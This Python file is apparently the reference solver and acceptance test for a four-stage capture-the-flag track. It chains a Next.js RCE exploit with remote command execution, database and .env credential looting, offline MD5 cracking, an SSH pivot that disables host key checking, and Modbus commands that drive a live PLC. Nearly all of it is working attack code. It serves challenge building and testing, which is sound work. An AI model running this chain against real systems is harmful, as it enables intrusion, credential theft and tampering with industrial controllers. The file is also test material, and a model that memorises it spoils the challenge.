#!/usr/bin/env python3
"""
Coremelt — full-chain reference solver and per-build acceptance test.

The Coremelt track is four chained challenges sharing one live instance. This
one solver drives the entire chain and recovers all four flags; each challenge
folder ships a copy, and its WRITEUP.md points at the flag that challenge scores.

  Stage 0  fingerprint :3000 (Next.js app; middleware decoy renders /_not-found)
  Stage 1  React2Shell RCE (CVE-2025-55182) -> read /flag.txt        [C1 Foothold]
  Stage 2  loot corewatch.db; crack the one crackable MD5 (rockyou, offline);
           decrypt the openssl-salted rtu_secrets memo with it        [C2 Keys]
  Stage 3  SSH-pivot j.reyes@127.0.0.1 (eng-ws) THROUGH the web container (reused cred);
           read ~/flag.txt on the OT host                             [C3 Deeper In]
  Stage 4  pull the OpenPLC project, reverse the ladder gate -> 64-bit trigger,
           drive the live PLC over Modbus:
             no trigger -> GATE=0/empty ; trigger -> GATE=1 + flag    [C4 Core]

Nothing is hardcoded: every flag and the trigger are recovered from live
artifacts. Exits 0 only if all four flags come out and the gate behaves.

usage: solve.py [target_host] [target_port]   (defaults 127.0.0.1 3000)
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import sys

from exploit_react2shell import React2Shell

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3000
ROCKYOU = os.environ.get("ROCKYOU", os.path.expanduser("~/coremelt-build/wordlists/rockyou.txt"))
MASK = 0xFFFF


def log(m):
    print(m, flush=True)


def redact(s):
    return re.sub(r"flag\{[^}]*\}", "flag{***}", s)


# ── ladder-gate reversal (reads only the shipped .st) ──
def ror16(x, r):
    return ((x >> r) | (x << (16 - r))) & MASK


def _tok(t):
    t = t.strip()
    if t.lower().startswith("16#"):
        return int(t[3:], 16)
    if t.lower().startswith("0x"):
        return int(t, 16)
    return int(t)


def parse_array(st, name):
    m = re.search(name + r"\s*:\s*ARRAY\[[^\]]*\]\s*OF\s*\w+\s*:=\s*\[([^\]]*)\]", st, re.S)
    return [_tok(x) for x in m.group(1).split(",") if x.strip()]


def solve_gate(st):
    SBOX = parse_array(st, "SCRAMBLER")
    C = parse_array(st, "SIG")
    FLAG_ENC = parse_array(st, "OVERRIDE_PAYLOAD")
    MULT = int(re.search(r"WORD_TO_UINT\(t\)\s*\*\s*UINT#(\d+)", st).group(1))
    ADD = int(re.search(r"WORD_TO_UINT\(t\)\s*\+\s*UINT#(\d+)", st).group(1))
    ROT = int(re.search(r"ROL\(IN\s*:=\s*UINT_TO_WORD\(tu\),\s*N\s*:=\s*(\d+)\)", st).group(1))
    IV = int(re.search(r"prevw\s*:=\s*16#([0-9A-Fa-f]{4})", st).group(1), 16)
    KSIV = int(re.search(r"kstate\s*:=\s*USINT#(\d+)", st).group(1))

    inv_sbox = [0] * 256
    for i, v in enumerate(SBOX):
        inv_sbox[v] = i
    inv_mult = pow(MULT, -1, 0x10000)

    def sub_word(w, box):
        return (box[(w >> 8) & 0xFF] << 8) | box[w & 0xFF]

    trigger, prev = [], IV
    for ct in C:
        t = (ct - ADD) & MASK
        t = ror16(t, ROT)
        t = (t * inv_mult) & MASK
        t = sub_word(t, inv_sbox)
        trigger.append(t ^ prev)
        prev = ct

    tb = []
    for w in trigger:
        tb += [(w >> 8) & 0xFF, w & 0xFF]
    ks, state = [], KSIV
    for i in range(len(FLAG_ENC)):
        state = SBOX[(state + tb[i % 8] + i) & 0xFF]
        ks.append(state)
    flag = bytes(FLAG_ENC[i] ^ ks[i] for i in range(len(FLAG_ENC))).split(b"\x00")[0].decode(errors="replace")
    return trigger, flag


def crack_md5(target, wordlist):
    with open(wordlist, "rb") as f:
        for line in f:
            w = line.rstrip(b"\r\n")
            if hashlib.md5(w).hexdigest() == target:
                return w.decode("latin-1")
    return None


def ssh_pivot_cmd(password, user, host, remote):
    """Non-interactive password SSH from inside the web foothold (OpenSSH>=8.4)."""
    return (
        "printf '#!/bin/sh\\necho %s\\n' > /tmp/ap && chmod +x /tmp/ap && "
        "SSH_ASKPASS=/tmp/ap SSH_ASKPASS_REQUIRE=force setsid -w "
        "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        "-o GlobalKnownHostsFile=/dev/null %s@%s %s"
    ) % (password, user, host, remote)


def main():
    sh = React2Shell(TARGET_HOST, TARGET_PORT)
    log("[*] target %s:%d (React2Shell, error-based exfil — no egress needed)"
        % (TARGET_HOST, TARGET_PORT))
    flags = {}

    # ── Stage 0: fingerprint ────────────────────────────────────────────────
    import http.client

    def _get(path):
        c = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT, timeout=10)
        c.request("GET", path)
        r = c.getresponse()
        b = r.read().decode("utf-8", "replace")
        c.close()
        return r.status, b

    st_root, body = _get("/")
    st_admin, _ = _get("/admin")
    is_next = ("/_next/" in body) or ("CoreWatch" in body)
    dashboard = "CoreWatch" in body
    decoy = st_admin == 404  # privileged area "gated" by middleware -> CVE-2025-29927 bait
    log("[0] fingerprint: / HTTP %d (dashboard=%s, next.js=%s); /admin HTTP %d (middleware-gated decoy=%s)"
        % (st_root, dashboard, is_next, st_admin, decoy))

    # ── Stage 1 (C1 Foothold): RCE + /flag.txt ──────────────────────────────
    log("[1] RCE as: %s" % sh.run("id").strip())
    flags["C1"] = sh.run("cat /flag.txt").strip()
    assert flags["C1"].startswith("flag{"), "C1 flag not recovered"
    log("[1] C1 (foothold /flag.txt): %s" % redact(flags["C1"]))

    # ── Stage 2 (C2 Keys): loot, crack, decrypt engineer memo ───────────────
    dump = sh.run("sqlite3 /app/corewatch.db 'select username||\"|\"||password_md5||\"|\"||role from users'")
    users = [ln.split("|") for ln in dump.strip().splitlines() if "|" in ln]
    log("[2] users: " + ", ".join("%s(%s)" % (u[0], u[2]) for u in users))
    env = sh.run("cat /app/.env")
    ws_host = re.search(r"PLC_WS_HOST=(\S+)", env).group(1)
    ws_user = re.search(r"PLC_WS_USER=(\S+)", env).group(1)
    log("[2] breadcrumb: PLC_WS_HOST=%s PLC_WS_USER=%s" % (ws_host, ws_user))

    cracked = cracked_user = None
    for uname, h, role in users:
        pw = crack_md5(h, ROCKYOU)
        if pw:
            cracked, cracked_user = pw, uname
            log("[2] cracked %s (%s) against rockyou -> [len %d]" % (uname, role, len(pw)))
        else:
            log("[2] %s: no rockyou match (as designed)" % uname)
    assert cracked, "no credential cracked"
    assert cracked_user == ws_user, "cracked user != breadcrumb user"

    blob_b64 = sh.run("sqlite3 /app/corewatch.db 'select blob from rtu_secrets limit 1'").strip()
    assert blob_b64.startswith("U2FsdGVk"), "rtu_secrets blob is not openssl-salted"
    memo = subprocess.run(
        ["openssl", "enc", "-d", "-aes-256-cbc", "-pbkdf2", "-iter", "10000",
         "-md", "sha256", "-pass", "pass:" + cracked],
        input=base64.b64decode(blob_b64), capture_output=True).stdout.decode("utf-8", "replace")
    m = re.search(r"flag\{[^}]+\}", memo)
    assert m, "C2 flag not found in decrypted memo"
    flags["C2"] = m.group(0)
    log("[2] C2 (decrypted engineer memo): %s" % redact(flags["C2"]))

    # ── Stage 3 (C3 Deeper In): SSH pivot to 127.0.0.1, read ~/flag.txt on eng-ws
    home_flag = sh.run(ssh_pivot_cmd(cracked, ws_user, ws_host, "'cat flag.txt'"))
    if "flag{" not in home_flag:  # retry without setsid if unavailable
        home_flag = sh.run(ssh_pivot_cmd(cracked, ws_user, ws_host, "'cat flag.txt'").replace("setsid -w ", ""))
    m = re.search(r"flag\{[^}]+\}", home_flag)
    assert m, "C3 flag not recovered over the SSH pivot"
    flags["C3"] = m.group(0)
    log("[3] pivoted j.reyes@%s ; C3 (~/flag.txt on OT host): %s" % (ws_host, redact(flags["C3"])))

    # ── Stage 4 (C4 Core): pull project, reverse gate, drive PLC ────────────
    st = sh.run(ssh_pivot_cmd(cracked, ws_user, ws_host, "'cat plc_project/coremelt_gate.st'"))
    if "SCRAMBLER" not in st:
        st = sh.run(ssh_pivot_cmd(cracked, ws_user, ws_host, "'cat plc_project/coremelt_gate.st'").replace("setsid -w ", ""))
    assert "SCRAMBLER" in st and "OVERRIDE_PAYLOAD" in st, "did not recover the OpenPLC project"
    assert "flag{" not in st, "project .st should be ciphertext only"
    log("[4] pulled coremelt_gate.st (%d bytes, ciphertext only)" % len(st))

    trigger, flag4_offline = solve_gate(st)
    log("[4] reversed gate -> 64-bit trigger recovered; offline flag = %s" % redact(flag4_offline))

    mb_src = open(os.path.join(os.path.dirname(__file__), "mb_drive.py"), "rb").read()
    sh.run("echo %s | base64 -d > /tmp/mb.py" % base64.b64encode(mb_src).decode())

    def drive(words):
        out = sh.run("python3 /tmp/mb.py %s 502 %s" % (ws_host, " ".join(str(w) for w in words)))
        return json.loads(out.strip().splitlines()[-1])

    no_trig = drive([0, 0, 0, 0])
    log("[4] live no-trigger : GATE=%d flag=%r" % (no_trig["gate"], redact(no_trig["flag"])))
    with_trig = drive(trigger)
    log("[4] live w/ trigger : GATE=%d flag=%s" % (with_trig["gate"], redact(with_trig["flag"])))
    assert no_trig["gate"] == 0 and no_trig["flag"] == "", "gate must stay closed/empty without trigger"
    assert with_trig["gate"] == 1, "correct trigger must flip GATE_OPEN"
    assert with_trig["flag"] == flag4_offline and with_trig["flag"].startswith("flag{"), \
        "live PLC flag must match the offline decryption"
    flags["C4"] = with_trig["flag"]

    # ── acceptance ──────────────────────────────────────────────────────────
    vals = list(flags.values())
    assert len(set(vals)) == 4, "the four flags must be distinct"
    assert all(v.startswith("flag{") and v.endswith("}") for v in vals), "malformed flag"
    log("")
    log("=== ACCEPTANCE: PASS — 4/4 flags recovered ===")
    for k in ("C1", "C2", "C3", "C4"):
        log("    %s : recovered" % k)
    with open(os.path.join(os.path.dirname(__file__), ".recovered_flags"), "w") as f:
        for k in ("C1", "C2", "C3", "C4"):
            f.write("%s=%s\n" % (k, flags[k]))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except AssertionError as e:
        log("=== ACCEPTANCE: FAIL === %s" % e)
        sys.exit(1)
